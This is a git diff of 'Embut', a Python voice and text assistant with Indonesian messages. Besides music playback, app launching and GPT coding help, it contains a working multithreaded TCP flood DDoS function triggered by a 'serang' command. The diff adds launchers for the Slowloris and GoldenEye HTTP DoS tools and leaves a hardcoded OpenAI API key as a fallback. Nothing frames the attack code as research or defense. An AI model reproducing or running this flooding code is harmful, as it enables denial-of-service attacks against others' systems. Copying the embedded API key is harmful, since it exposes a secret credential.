@@ -15,41 +15,46 @@ import sys
 import platform
 import subprocess
 import speech_recognition as sr
-from optparse import OptionParser
 from colorama import init, Fore, Style
+import pyfiglet
 
-openai.api_key = "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"
+# === KONFIGURASI ===
+openai.api_key = os.getenv("OPENAI_API_KEY", "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")
 
-# Inisialisasi suara
+init(autoreset=True)
 engine = pyttsx3.init()
 engine.setProperty('rate', 160)
 player = None
 
+# === GLOBAL FLAG UNTUK DDOS ===
+ddos_stop_flag = threading.Event()
+
 def ngomong(text):
-    print(f"🐱 Embut: {text}")
+    print(f"{Fore.GREEN}🐱 Embut: {text}{Fore.RESET}")
     engine.say(text)
     engine.runAndWait()
 
 def hear_the_sound():
     r = sr.Recognizer()
     with sr.Microphone() as source:
-        print("Listening...")
+        print(Fore.CYAN + "🎤 Listening..." + Fore.RESET)
         audio = r.listen(source)
         try:
             order = r.recognize_google(audio, language="id-ID")
-            print(f"> (Suara) {order}")
+            print(f"{Fore.LIGHTYELLOW_EX}> (Suara) {order}{Fore.RESET}")
             return order.lower()
         except:
-            ngomong("SORRY CAN YOU SAY A LITTLE CLEARER PLEASE")
+            ngomong("Maaf, tolong ulangi lebih jelas.")
             return ""
 
 def buka_aplikasi(name):
-    if name == "chrome":
-        os.system("start chrome")
-        ngomong("Chrome terbuka")
-    elif name == "notepad":
-        os.system("start notepad")
-        ngomong("Notepad terbuka")
+    apps = {
+        "chrome": "start chrome",
+        "notepad": "start notepad"
+    }
+    if name in apps:
+        os.system(apps[name])
+        ngomong(f"{name.capitalize()} terbuka")
     else:
         ngomong("Aplikasi tidak dikenali")
 
@@ -64,51 +69,38 @@ def bantu_ngoding(perintah):
         )
         jawaban = response["choices"][0]["message"]["content"]
         ngomong("Ini jawabannya...")
-        print(jawaban)
+        print(Fore.LIGHTMAGENTA_EX + jawaban + Fore.RESET)
         ngomong(jawaban[:100])
     except Exception as e:
-        print(f"⚠️ Gagal ambil jawaban dari Embut: {e}")
+        print(f"{Fore.RED}⚠️ Gagal ambil jawaban dari Embut: {e}{Fore.RESET}")
 
 def play_lagu(judul):
     global player
-
     if not judul:
         ngomong("Judul lagunya nggak boleh kosong.")
         return
-
     try:
-        # Set path VLC (Windows)
         vlc_path = r"C:\Program Files\VideoLAN\VLC\vlc.exe"
         os.environ["PATH"] += os.pathsep + os.path.dirname(vlc_path)
-
-        # Opsi buat YouTube-dl
         ydl_opts = {
             'format': 'bestaudio/best',
             'quiet': True,
             'default_search': 'ytsearch1',
             'nocheckcertificate': True,
         }
-
         with yt_dlp.YoutubeDL(ydl_opts) as ydl:
             info = ydl.extract_info(judul, download=False)
-            if 'entries' in info:
-                stream_url = info['entries'][0]['url']
-            else:
-                stream_url = info['url']
-
+            stream_url = info['entries'][0]['url'] if 'entries' in info else info['url']
         ngomong(f"Muterin lagu: {judul} langsung dari YouTube...")
-
-        # Mainin lagu pakai VLC
         instance = vlc.Instance()
         player = instance.media_player_new()
         media = instance.media_new(stream_url)
         player.set_media(media)
         player.play()
-
-        time.sleep(1)  # Kasih waktu dikit buat mulai play
-
+        time.sleep(1)
     except Exception as e:
         ngomong(f"⚠️ Gagal muter lagu: {str(e)}")
+
 def pause_lagu():
     global player
     if player:
@@ -131,144 +123,139 @@ def log_aktivitas(command):
     with open("log.txt", "a") as file:
         file.write(f"[{waktu_sekarang}] {command}\n")
 
-
-#Warna terminal (bisa disesuaikan)
-R = "\033[91m"
-G = "\033[92m"
-Y = "\033[93m"
-C = "\033[96m"
-W = "\033[0m"
-
-# Fungsi serangan TCP flood DDoS
 def ddos_attack(ip, port):
-    while True:
+    while not ddos_stop_flag.is_set():
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(0.5)
             s.connect((ip, port))
-            packet = random._urandom(1024)  # paket acak 1024 bytes
+            packet = random._urandom(1024)
             s.send(packet)
-            print(R + f"[+] Packet sent to {ip}:{port}" + W)
+            print(Fore.RED + f"[+] Packet sent to {ip}:{port}" + Fore.RESET)
             s.close()
-        except Exception as e:
-            print(Y + f"[!] Error: {e}" + W)
+        except Exception:
+            pass
 
 def start_ddos(ip, port, threads):
-    print(G + f"Mulai serangan ke {ip}:{port} dengan {threads} thread..." + W)
+    ddos_stop_flag.clear()
+    print(Fore.GREEN + f"🚀 Mulai serangan ke {ip}:{port} dengan {threads} thread..." + Fore.RESET)
     for _ in range(threads):
         t = threading.Thread(target=ddos_attack, args=(ip, port))
         t.daemon = True
         t.start()
+    print(Fore.YELLOW + "Tekan CTRL+C untuk menghentikan serangan." + Fore.RESET)
+    try:
+        while not ddos_stop_flag.is_set():
+            time.sleep(1)
+    except KeyboardInterrupt:
+        ddos_stop_flag.set()
+        print(Fore.CYAN + "\n🛑 Serangan dihentikan oleh user." + Fore.RESET)
 
 def cek_ping_ip(ip_address):
     print(f"\n=== PING KE {ip_address} ===")
     try:
-        # Cek ping
-        if platform.system().lower() == "windows":
-            ping_cmd = ["ping", "-n", "4", ip_address]
-        else:
-            ping_cmd = ["ping", "-c", "4", ip_address]
-
+        ping_cmd = ["ping", "-n", "4", ip_address] if platform.system().lower() == "windows" else ["ping", "-c", "4", ip_address]
         result = subprocess.run(ping_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-
         if result.returncode == 0:
-            print("[✓] Ping berhasil!")
+            print(Fore.GREEN + "[✓] Ping berhasil!" + Fore.RESET)
             print(result.stdout)
-
-            match = re.search(r'rtt min/avg/max/mdev = .*/(.*?)/', result.stdout)
+            match = re.search(r'Average = (\d+ms)', result.stdout)
             if match:
-                print(f"\n[✓] Rata-rata latency: {match.group(1)} ms")
-
-            match_win = re.search(r'Average = (\d+ms)', result.stdout)
-            if match_win:
-                print(f"\n[✓] Rata-rata latency: {match_win.group(1)}")
+                print(f"\n[✓] Rata-rata latency: {match.group(1)}")
         else:
-            print("[!] Gagal ping.")
+            print(Fore.RED + "[!] Gagal ping." + Fore.RESET)
             print(result.stderr)
-
     except Exception as e:
-        print(f"[!] Error saat ping: {e}")
+        print(f"{Fore.RED}[!] Error saat ping: {e}{Fore.RESET}")
 
 def tampilkan_menu():
-    print(Fore.YELLOW + "===================== 📜 SCRIP BY YIRUM4 ===========================\n")
-    
-    print(Fore.MAGENTA + "🎵 MUSIK")
-    print(Fore.LIGHTGREEN_EX + "  ▶ play [judul lagu]" + Fore.WHITE + "         ➜ Muterin lagu langsung dari YouTube")
-    print(Fore.LIGHTGREEN_EX + "  ⏸ pause" + Fore.WHITE + "                    ➜ Jeda lagu yang sedang diputar")
-    print(Fore.LIGHTGREEN_EX + "  ⏹ stop" + Fore.WHITE + "                     ➜ Hentikan lagu yang sedang diputar\n")
-    
-    print(Fore.MAGENTA + "🌐 APLIKASI")
-    print(Fore.LIGHTGREEN_EX + "  🌍 buka chrome" + Fore.WHITE + "              ➜ Buka Google Chrome")
-    print(Fore.LIGHTGREEN_EX + "  📄 buka notepad" + Fore.WHITE + "             ➜ Buka Notepad\n")
-
-    print(Fore.MAGENTA + "⚔️ ATTACK & NETWORK")
-    print(Fore.LIGHTGREEN_EX + "  💣 serang [ip] [port] [threads]" + Fore.WHITE + " ➜ Mulai serangan DDoS TCP Flood")
-    print(Fore.LIGHTGREEN_EX + "  🔍 cekip [domain]" + Fore.WHITE + "           ➜ Cek IP dan port dari domain")
-    print(Fore.LIGHTGREEN_EX + "  📡 cekping [ip/domain]" + Fore.WHITE + "      ➜ Cek koneksi (ping)\n")
-
-    print(Fore.MAGENTA + "🤡 HACKING (Brute Force Instagram)")
-    
-
-    print(Fore.MAGENTA + "🤖 AI CODING")
-    print(Fore.LIGHTGREEN_EX + "  💬 tanya [perintah]" + Fore.WHITE + "         ➜ Nanya soal coding ke GPT\n")
-
-    print(Fore.MAGENTA + "🗣️ INPUT MODE")
-    print(Fore.LIGHTGREEN_EX + "  🎙️ suara" + Fore.WHITE + "                   ➜ Gunakan perintah suara")
-    print(Fore.LIGHTGREEN_EX + "  ⌨️ ketik" + Fore.WHITE + "                   ➜ Gunakan perintah ketikan\n")
-
-    print(Fore.MAGENTA + "🔧 LAINNYA")
-    print(Fore.LIGHTGREEN_EX + "  📋 menu" + Fore.WHITE + "                    ➜ Tampilkan menu ini lagi")
-    print(Fore.LIGHTGREEN_EX + "  🧹 clear" + Fore.WHITE + "                   ➜ Bersihkan layar")
-    print(Fore.LIGHTGREEN_EX + "  ❌ exit" + Fore.WHITE + "                    ➜ Keluar dari Embut\n")
-
-    print(Fore.YELLOW + "===================================================================\n")
-
+    # Neon ASCII Title
+    ascii_banner = pyfiglet.figlet_format("EMBUT", font="slant")
+    for line in ascii_banner.splitlines():
+        for i in range(0, 10):
+            sys.stdout.write(Fore.LIGHTMAGENTA_EX + " " * i + line + "\r")
+            sys.stdout.flush()
+            time.sleep(0.01)
+        print(Fore.LIGHTCYAN_EX + " " * 10 + line)
+    print(Fore.YELLOW + "=" * 70)
+    # Menu items tampil normal, hanya sekali, tetap berwarna
+    menu_items = [
+        (Fore.MAGENTA, "🎵 MUSIK"),
+        (Fore.LIGHTGREEN_EX, "  ▶ play [judul lagu]" + Fore.WHITE + "         ➜ Muterin lagu langsung dari YouTube"),
+        (Fore.LIGHTGREEN_EX, "  ⏸ pause" + Fore.WHITE + "                    ➜ Jeda lagu yang sedang diputar"),
+        (Fore.LIGHTGREEN_EX, "  ⏹ stop" + Fore.WHITE + "                     ➜ Hentikan lagu yang sedang diputar\n"),
+        (Fore.MAGENTA, "🌐 APLIKASI"),
+        (Fore.LIGHTGREEN_EX, "  🌍 buka chrome" + Fore.WHITE + "              ➜ Buka Google Chrome"),
+        (Fore.LIGHTGREEN_EX, "  📄 buka notepad" + Fore.WHITE + "             ➜ Buka Notepad\n"),
+        (Fore.MAGENTA, "⚔️ ATTACK & NETWORK"),
+        (Fore.LIGHTGREEN_EX, "  💣 serang [ip] [port] [threads]" + Fore.WHITE + " ➜ Mulai serangan DDoS TCP Flood"),
+        (Fore.LIGHTGREEN_EX, "  🛑 stopddos" + Fore.WHITE + "                 ➜ Hentikan serangan DDoS"),
+        (Fore.LIGHTGREEN_EX, "  🔍 cekip [domain]" + Fore.WHITE + "           ➜ Cek IP dan port dari domain"),
+        (Fore.LIGHTGREEN_EX, "  📡 cekping [ip/domain]" + Fore.WHITE + "      ➜ Cek koneksi (ping)\n"),
+        (Fore.MAGENTA, "🤖 AI CODING"),
+        (Fore.LIGHTGREEN_EX, "  💬 tanya [perintah]" + Fore.WHITE + "         ➜ Nanya soal coding ke GPT\n"),
+        (Fore.MAGENTA, "🛠️ HACKING TOOLS"),
+        (Fore.LIGHTGREEN_EX, "  🐍 slowloris [target]" + Fore.WHITE + "        ➜ Jalankan serangan Slowloris"),
+        (Fore.LIGHTGREEN_EX, "  🦾 goldeneye" + Fore.WHITE + "                ➜ Jalankan GoldenEye (HTTP DoS)\n"),
+        (Fore.MAGENTA, "🗣️ INPUT MODE"),
+        (Fore.LIGHTGREEN_EX, "  🎙️ suara" + Fore.WHITE + "                   ➜ Gunakan perintah suara"),
+        (Fore.LIGHTGREEN_EX, "  ⌨️ ketik" + Fore.WHITE + "                   ➜ Gunakan perintah ketikan\n"),
+        (Fore.MAGENTA, "🔧 LAINNYA"),
+        (Fore.LIGHTGREEN_EX, "  📋 menu" + Fore.WHITE + "                    ➜ Tampilkan menu ini lagi"),
+        (Fore.LIGHTGREEN_EX, "  🧹 clear" + Fore.WHITE + "                   ➜ Bersihkan layar"),
+        (Fore.LIGHTGREEN_EX, "  ❌ exit" + Fore.WHITE + "                    ➜ Keluar dari Embut\n"),
+    ]
+    for color, item in menu_items:
+        print(color + item)
+    print(Fore.YELLOW + "=" * 70)
 
 def proses_perintah(perintah):
-    log_aktivitas(perintah)  # Logging aktivitas
-
+    log_aktivitas(perintah)
     if perintah.startswith("buka "):
         app = perintah[5:]
         buka_aplikasi(app)
-
     elif perintah.startswith("tanya "):
         prompt = perintah[6:]
         bantu_ngoding(prompt)
-
     elif perintah.startswith("play "):
         judul = perintah[5:]
         play_lagu(judul)
-
     elif perintah == "pause":
         pause_lagu()
-
     elif perintah == "stop":
         stop_lagu()
-
     elif perintah == "menu":
         tampilkan_menu()
-
     elif perintah == "clear":
         os.system('cls' if os.name == 'nt' else 'clear')
-
     elif perintah.startswith("serang "):
         parts = perintah.split()
         if len(parts) < 2:
             ngomong("Format serang: serang [ip] [port] [threads]")
             return
-
         ip = parts[1]
-        port = int(parts[2]) if len(parts) > 2 else 80
-        threads = int(parts[3]) if len(parts) > 3 else 100
-
+        try:
+            port = int(parts[2]) if len(parts) > 2 else 80
+            threads = int(parts[3]) if len(parts) > 3 else 100
+            if not (1 <= port <= 65535):
+                ngomong("Port harus antara 1-65535!")
+                return
+            if threads < 1 or threads > 1000:
+                ngomong("Threads harus antara 1-1000!")
+                return
+        except ValueError:
+            ngomong("Port dan threads harus berupa angka!")
+            return
         try:
             ip = socket.gethostbyname(ip)
-        except:
-            ngomong("Gagal resolve IP")
+        except Exception as e:
+            ngomong(f"Gagal resolve IP: {e}")
             return
-
+        ngomong(f"Menyerang {ip}:{port} dengan {threads} thread. Tekan CTRL+C atau ketik 'stopddos' untuk berhenti.")
         start_ddos(ip, port, threads)
-
+    elif perintah == "stopddos":
+        ddos_stop_flag.set()
+        print(Fore.CYAN + "🛑 Permintaan stop DDoS diterima." + Fore.RESET)
     elif perintah.startswith("cekip "):
         domain = perintah[6:]
         try:
@@ -277,46 +264,48 @@ def proses_perintah(perintah):
             print("Port umum: 80 (HTTP), 443 (HTTPS)")
         except Exception as e:
             ngomong(f"Gagal resolve IP: {e}")
-
     elif perintah.startswith("cekping"):
         parts = perintah.split()
         target = parts[1] if len(parts) > 1 else "8.8.8.8"
-
         try:
             ip = socket.gethostbyname(target)
             cek_ping_ip(ip)
         except Exception as e:
             ngomong(f"Gagal resolve IP dari {target}: {e}")
-
+    elif perintah.startswith("slowloris "):
+        target = perintah.split(" ", 1)[1]
+        try:
+            subprocess.run(["slowloris", target])
+        except Exception as e:
+            ngomong(f"Gagal menjalankan slowloris: {e}")
+    elif perintah.startswith("goldeneye "):
+        try:
+            target = perintah.split(" ", 1)[1]
+            os.chdir("GoldenEye-master")
+            subprocess.run(["python", "goldeneye.py", target, "-w", "100"])
+            os.chdir("..")
+        except Exception as e:
+            ngomong(f"Gagal menjalankan GoldenEye: {e}")
     elif perintah == "exit":
-        ngomong("Sampai jumpa Putra!")
+        ngomong("Sampai jumpa rek!")
         exit()
-
     else:
         ngomong("Perintah tidak dikenali.")
-
-
-init(autoreset=True)  
 
 def main():
     ngomong("Halo, gue Embut. Mau ketik atau ngomong?")
     tampilkan_menu()
-    
     while True:
         mode = input(Fore.LIGHTCYAN_EX + "Ketik [suara] atau [ketik]: ").lower()
-        
         if mode == "suara":
             command = hear_the_sound()
-        
         elif mode == "ketik":
             waktu = datetime.datetime.now().strftime("%H:%M")
-            prompt = f"\033[92m[{waktu}] > \033[0m"
+            prompt = f"{Fore.GREEN}[{waktu}] > {Fore.RESET}"
             command = input(prompt).lower()
-        
         else:
             ngomong("Pilihannya cuma [suara] atau [ketik]")
             continue
-
         if command:
             proses_perintah(command)
 
